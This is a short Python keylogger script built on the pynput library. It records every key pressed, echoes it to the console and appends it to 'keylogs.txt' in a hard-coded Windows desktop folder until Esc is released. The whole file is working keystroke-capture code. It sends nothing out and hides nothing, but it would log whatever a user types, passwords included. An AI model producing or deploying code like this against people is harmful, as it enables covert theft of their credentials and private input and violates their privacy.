from pynput.keyboard import Key, Listener
# import logging

key_info = 'keylogs.txt'
file_path = "C:\\Users\\Sean\\Desktop\\Keylogs\\"

COUNT = 0
KEYS = []


# log_direct = ""
# logging.basicConfig(filename=(log_direct + "keylogs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')


def on_press(key):
    global KEYS, COUNT

    print(key)
    KEYS.append(key)
    COUNT += 1

    if COUNT >= 1:
        COUNT = 0
        write_to_file(KEYS)
        KEYS = []
    # logging.info(str(key))


def write_to_file(KEYS):
    with open(file_path + key_info, "a") as f:
        for key in KEYS:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
